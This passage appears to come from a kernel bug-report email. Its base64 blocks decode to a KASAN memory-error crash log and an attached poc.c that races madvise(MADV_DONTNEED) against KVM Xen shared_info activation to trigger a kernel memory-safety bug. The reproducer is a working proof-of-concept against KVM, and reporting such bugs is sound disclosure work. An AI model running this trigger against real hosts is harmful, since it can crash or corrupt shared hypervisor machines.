PyBfX2thc2FuX2NoZWNrX3JlYWQrMHgxMS8weDIwClsgIDIzMi4zMjc4NDRdICA/IGZwcmVnc19h
c3NlcnRfc3RhdGVfY29uc2lzdGVudCsweDVjLzB4MTAwClsgIDIzMi4zMjc4NDRdICA/IF9fa2Fz
YW5fY2hlY2tfd3JpdGUrMHgxNC8weDMwClsgIDIzMi4zMjc4NDRdICA/IF9fa2FzYW5fY2hlY2tf
d3JpdGUrMHgxNC8weDMwClsgIDIzMi4zMjc4NDRdICA/IGZwdXQrMHgyNy8weGEwClsgIDIzMi4z
Mjc4NDRdICA/IF9fa2FzYW5fY2hlY2tfcmVhZCsweDExLzB4MjAKWyAgMjMyLjMyNzg0NF0gID8g
ZnByZWdzX2Fzc2VydF9zdGF0ZV9jb25zaXN0ZW50KzB4NWMvMHgxMDAKWyAgMjMyLjMyNzg0NF0g
ID8gZG9fc3lzY2FsbF82NCsweDExYS8weDY0MApbICAyMzIuMzI3ODQ0XSAgPyBfX2thc2FuX2No
ZWNrX3JlYWQrMHgxMS8weDIwClsgIDIzMi4zMjc4NDRdICA/IGZwcmVnc19hc3NlcnRfc3RhdGVf
Y29uc2lzdGVudCsweDVjLzB4MTAwClsgIDIzMi4zMjc4NDRdICA/IGRvX3N5c2NhbGxfNjQrMHgx
MWEvMHg2NDAKWyAgMjMyLjMyNzg0NF0gID8gX19rYXNhbl9jaGVja193cml0ZSsweDE0LzB4MzAK
WyAgMjMyLjMyNzg0NF0gID8gX19rYXNhbl9jaGVja193cml0ZSsweDE0LzB4MzAKWyAgMjMyLjMy
Nzg0NF0gID8gZnB1dCsweDI3LzB4YTAKWyAgMjMyLjMyNzg0NF0gID8gX19rYXNhbl9jaGVja193
cml0ZSsweDE0LzB4MzAKWyAgMjMyLjMyNzg0NF0gID8gX19rYXNhbl9jaGVja193cml0ZSsweDE0
LzB4MzAKWyAgMjMyLjMyNzg0NF0gID8gZnB1dCsweDI3LzB4YTAKWyAgMjMyLjMyNzg0NF0gID8g
X19rYXNhbl9jaGVja19yZWFkKzB4MTEvMHgyMApbICAyMzIuMzI3ODQ0XSAgPyBmcHJlZ3NfYXNz
ZXJ0X3N0YXRlX2NvbnNpc3RlbnQrMHg1Yy8weDEwMApbICAyMzIuMzI3ODQ0XSAgPyBkb19zeXNj
YWxsXzY0KzB4MTFhLzB4NjQwClsgIDIzMi4zMjc4NDRdICA/IGRvX3N5c2NhbGxfNjQrMHgxMWEv
MHg2NDAKWyAgMjMyLjMyNzg0NF0gID8gZG9fc3lzY2FsbF82NCsweDExYS8weDY0MApbICAyMzIu
MzI3ODQ0XSAgPyBkb19zeXNjYWxsXzY0KzB4OTQvMHg2NDAKWyAgMjMyLjMyNzg0NF0gIGVudHJ5
X1NZU0NBTExfNjRfYWZ0ZXJfaHdmcmFtZSsweDc2LzB4N2UKWyAgMjMyLjMyNzg0NF0gUklQOiAw
MDMzOjB4NDE2NjVkClsgIDIzMi4zMjc4NDRdIENvZGU6IDA0IDI1IDI4IDAwIDAwIDAwIDQ4IDg5
IDQ1IGM4IDMxIGMwIDQ4IDhkIDQ1IDEwIGM3IDQ1IGIwIDEwIDAwIDAwIDAwIDQ4IDg5IDQ1IGI4
IDQ4IDhkIDQ1IGQwIDQ4IDg5IDQ1IGMwIGI4IDEwIDAwIDAwIDAwIDBmIDA1IDw4OT4gYzIgM2Qg
MDAgZjAgZmYgZmYgNzcgMWEgNDggOGIgNDUgYzggNjQgNDggMmIgMDQgMjUgMjggMDAgMDAgMDAK
WyAgMjMyLjMyNzg0NF0gUlNQOiAwMDJiOjAwMDA3NzhhMTQ4YTQwNDAgRUZMQUdTOiAwMDAwMDI0
NiBPUklHX1JBWDogMDAwMDAwMDAwMDAwMDAxMApbICAyMzIuMzI3ODQ0XSBSQVg6IGZmZmZmZmZm
ZmZmZmZmZGEgUkJYOiAwMDAwMDAwMDAwMDAwMDA0IFJDWDogMDAwMDAwMDAwMDQxNjY1ZApbICAy
MzIuMzI3ODQ0XSBSRFg6IDAwMDA3NzhhMTQ4YTQwYTAgUlNJOiAwMDAwMDAwMDQwNDhhZWM5IFJE
STogMDAwMDAwMDAwMDAwMDAwNApbICAyMzIuMzI3ODQ0XSBSQlA6IDAwMDA3NzhhMTQ4YTQwOTAg
UjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogMDAwMDAwMDAwMDAwMDAwMQpbICAyMzIuMzI3ODQ0
XSBSMTA6IDAwMDAwMDAwMDAwMDAwMDggUjExOiAwMDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAwMDc3
OGExNDhhNDZjMApbICAyMzIuMzI3ODQ0XSBSMTM6IDAwMDA3ZmZlZWU0YTBlZTAgUjE0OiAwMDAw
Nzc4YTE0OGE0Y2U0IFIxNTogMDAwMDdmZmVlZTRhMGZkNwpbICAyMzIuMzI3ODQ0XSAgPC9UQVNL
PgpbICAyMzIuMzI3ODQ0XSAKWyAgMjMyLjMyNzg0NF0gVGhlIGJ1Z2d5IGFkZHJlc3MgYmVsb25n
cyB0byB0aGUgcGh5c2ljYWwgcGFnZToKWyAgMjMyLjMyNzg0NF0gcGFnZTogcmVmY291bnQ6MCBt
YXBjb3VudDowIG1hcHBpbmc6MDAwMDAwMDAwMDAwMDAwMCBpbmRleDoweDc3OGExNTBhNiBwZm46
MHg0NjAwMApbICAyMzIuMzI3ODQ0XSBmbGFnczogMHhmZmZmZmMwMDAwMDAwKG5vZGU9MHx6b25l
PTF8bGFzdGNwdXBpZD0weDFmZmZmZikKWyAgMjMyLjMyNzg0NF0gcmF3OiAwMDBmZmZmZmMwMDAw
MDAwIGZmZmZlYTAwMDEwZTFmYzggZmZmZjg4ODExYWVjYjY3MCAwMDAwMDAwMDAwMDAwMDAwClsg
IDIzMi4zMjc4NDRdIHJhdzogMDAwMDAwMDc3OGExNTBhNiAwMDAwMDAwMDAwMDAwMDAwIDAwMDAw
MDAwZmZmZmZmZmYgMDAwMDAwMDAwMDAwMDAwMApbICAyMzIuMzI3ODQ0XSBwYWdlIGR1bXBlZCBi
ZWNhdXNlOiBrYXNhbjogYmFkIGFjY2VzcyBkZXRlY3RlZApbICAyMzIuMzI3ODQ0XSAKWyAgMjMy
LjMyNzg0NF0gTWVtb3J5IHN0YXRlIGFyb3VuZCB0aGUgYnVnZ3kgYWRkcmVzczoKWyAgMjMyLjMy
Nzg0NF0gIGZmZmY4ODgwNDYwMDA4MDA6IGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZm
IGZmIGZmIGZmIGZmIGZmClsgIDIzMi4zMjc4NDRdICBmZmZmODg4MDQ2MDAwODgwOiBmZiBmZiBm
ZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZgpbICAyMzIuMzI3ODQ0XSA+
ZmZmZjg4ODA0NjAwMDkwMDogZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYg
ZmYgZmYgZmYKWyAgMjMyLjMyNzg0NF0gICAgICAgICAgICAgICAgICAgIF4KWyAgMjMyLjMyNzg0
NF0gIGZmZmY4ODgwNDYwMDA5ODA6IGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZm
IGZmIGZmIGZmIGZmClsgIDIzMi4zMjc4NDRdICBmZmZmODg4MDQ2MDAwYTAwOiBmZiBmZiBmZiBm
ZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZgpbICAyMzIuMzI3ODQ0XSA9PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT0KWyAgMjMyLjMyNzg0NF0gRGlzYWJsaW5nIGxvY2sgZGVidWdnaW5nIGR1ZSB0byBrZXJu
ZWwgdGFpbnQK
--00000000000014f4670658c8a44c
Content-Type: application/octet-stream; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <f_msox99xs0>
X-Attachment-Id: f_msox99xs0

I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8ZXJybm8uaD4KI2luY2x1ZGUgPGZjbnRsLmg+
CiNpbmNsdWRlIDxsaW51eC9rdm0uaD4KI2luY2x1ZGUgPHB0aHJlYWQuaD4KI2luY2x1ZGUgPHNj
aGVkLmg+CiNpbmNsdWRlIDxzdGRhdG9taWMuaD4KI2luY2x1ZGUgPHN0ZGludC5oPgojaW5jbHVk
ZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNs
dWRlIDxzeXMvaW9jdGwuaD4KI2luY2x1ZGUgPHN5cy9tbWFuLmg+CiNpbmNsdWRlIDx0aW1lLmg+
CiNpbmNsdWRlIDx1bmlzdGQuaD4KCiNkZWZpbmUgUEFHRV9CWVRFUyA0MDk2CiNkZWZpbmUgUlVO
X1NFQ09ORFMgOTAKCnN0YXRpYyBhdG9taWNfaW50IHN0b3A7CnN0YXRpYyB2b2lkICpzaGFyZWRf
aW5mb19wYWdlOwpzdGF0aWMgaW50IHZtZmQ7CgpzdGF0aWMgdm9pZCBmYWlsKGNvbnN0IGNoYXIg
KndoYXQpCnsKCWZwcmludGYoc3RkZXJyLCAiJXM6ICVzXG4iLCB3aGF0LCBzdHJlcnJvcihlcnJu
bykpOwoJZXhpdChFWElUX0ZBSUxVUkUpOwp9CgpzdGF0aWMgdm9pZCBwaW5fdG9fY3B1KGludCBj
cHUpCnsKCWNwdV9zZXRfdCBzZXQ7CgoJQ1BVX1pFUk8oJnNldCk7CglDUFVfU0VUKGNwdSwgJnNl
dCk7CglpZiAoc2NoZWRfc2V0YWZmaW5pdHkoMCwgc2l6ZW9mKHNldCksICZzZXQpKQoJCWZhaWwo
InNjaGVkX3NldGFmZmluaXR5Iik7Cn0KCnN0YXRpYyB2b2lkICpkaXNjYXJkX3BhZ2Uodm9pZCAq
dW51c2VkKQp7Cgkodm9pZCl1bnVzZWQ7CglwaW5fdG9fY3B1KDEpOwoKCXdoaWxlICghYXRvbWlj
X2xvYWRfZXhwbGljaXQoJnN0b3AsIG1lbW9yeV9vcmRlcl9yZWxheGVkKSkgewoJCWlmIChtYWR2
aXNlKHNoYXJlZF9pbmZvX3BhZ2UsIFBBR0VfQllURVMsIE1BRFZfRE9OVE5FRUQpKQoJCQlmYWls
KCJtYWR2aXNlIik7Cgl9CgoJcmV0dXJuIE5VTEw7Cn0KCnN0YXRpYyB2b2lkICpyZWZyZXNoX2Nh
Y2hlKHZvaWQgKnVudXNlZCkKewoJc3RydWN0IGt2bV94ZW5faHZtX2F0dHIgYWN0aXZhdGUgPSB7
CgkJLnR5cGUgPSBLVk1fWEVOX0FUVFJfVFlQRV9TSEFSRURfSU5GT19IVkEsCgkJLnUuc2hhcmVk
X2luZm8uaHZhID0gKHVpbnRwdHJfdClzaGFyZWRfaW5mb19wYWdlLAoJfTsKCXN0cnVjdCBrdm1f
eGVuX2h2bV9hdHRyIGRlYWN0aXZhdGUgPSB7CgkJLnR5cGUgPSBLVk1fWEVOX0FUVFJfVFlQRV9T
SEFSRURfSU5GT19IVkEsCgkJLnUuc2hhcmVkX2luZm8uaHZhID0gMCwKCX07CgoJKHZvaWQpdW51
c2VkOwoJcGluX3RvX2NwdSgwKTsKCgl3aGlsZSAoIWF0b21pY19sb2FkX2V4cGxpY2l0KCZzdG9w
LCBtZW1vcnlfb3JkZXJfcmVsYXhlZCkpIHsKCQlpZiAoaW9jdGwodm1mZCwgS1ZNX1hFTl9IVk1f
U0VUX0FUVFIsICZhY3RpdmF0ZSkgJiYgZXJybm8gIT0gRUZBVUxUKQoJCQlmYWlsKCJLVk1fWEVO
X0hWTV9TRVRfQVRUUiBhY3RpdmF0ZSIpOwoJCWlmIChpb2N0bCh2bWZkLCBLVk1fWEVOX0hWTV9T
RVRfQVRUUiwgJmRlYWN0aXZhdGUpKQoJCQlmYWlsKCJLVk1fWEVOX0hWTV9TRVRfQVRUUiBkZWFj
dGl2YXRlIik7Cgl9CgoJcmV0dXJuIE5VTEw7Cn0KCmludCBtYWluKHZvaWQpCnsKCXN0cnVjdCB0
aW1lc3BlYyBkdXJhdGlvbiA9IHsgLnR2X3NlYyA9IFJVTl9TRUNPTkRTIH07CglwdGhyZWFkX3Qg
ZGlzY2FyZF90aWQsIHJlZnJlc2hfdGlkOwoJaW50IGt2bWZkOwoKCWt2bWZkID0gb3BlbigiL2Rl
di9rdm0iLCBPX1JEV1IgfCBPX0NMT0VYRUMpOwoJaWYgKGt2bWZkIDwgMCkKCQlmYWlsKCJvcGVu
IC9kZXYva3ZtIik7CgoJdm1mZCA9IGlvY3RsKGt2bWZkLCBLVk1fQ1JFQVRFX1ZNLCAwKTsKCWlm
ICh2bWZkIDwgMCkKCQlmYWlsKCJLVk1fQ1JFQVRFX1ZNIik7CgoJc2hhcmVkX2luZm9fcGFnZSA9
IG1tYXAoTlVMTCwgUEFHRV9CWVRFUywgUFJPVF9SRUFEIHwgUFJPVF9XUklURSwKCQkJCU1BUF9Q
UklWQVRFIHwgTUFQX0FOT05ZTU9VUywgLTEsIDApOwoJaWYgKHNoYXJlZF9pbmZvX3BhZ2UgPT0g
TUFQX0ZBSUxFRCkKCQlmYWlsKCJtbWFwIik7CgkqKHZvbGF0aWxlIHVuc2lnbmVkIGNoYXIgKilz
aGFyZWRfaW5mb19wYWdlID0gMDsKCglpZiAocHRocmVhZF9jcmVhdGUoJmRpc2NhcmRfdGlkLCBO
VUxMLCBkaXNjYXJkX3BhZ2UsIE5VTEwpKQoJCWZhaWwoInB0aHJlYWRfY3JlYXRlIik7CglpZiAo
cHRocmVhZF9jcmVhdGUoJnJlZnJlc2hfdGlkLCBOVUxMLCByZWZyZXNoX2NhY2hlLCBOVUxMKSkK
CQlmYWlsKCJwdGhyZWFkX2NyZWF0ZSIpOwoKCW5hbm9zbGVlcCgmZHVyYXRpb24sIE5VTEwpOwoJ
YXRvbWljX3N0b3JlX2V4cGxpY2l0KCZzdG9wLCAxLCBtZW1vcnlfb3JkZXJfcmVsYXhlZCk7Cglw
dGhyZWFkX2pvaW4oZGlzY2FyZF90aWQsIE5VTEwpOwoJcHRocmVhZF9qb2luKHJlZnJlc2hfdGlk
LCBOVUxMKTsKCglyZXR1cm4gRVhJVF9TVUNDRVNTOwp9Cg==
--00000000000014f4670658c8a44c--
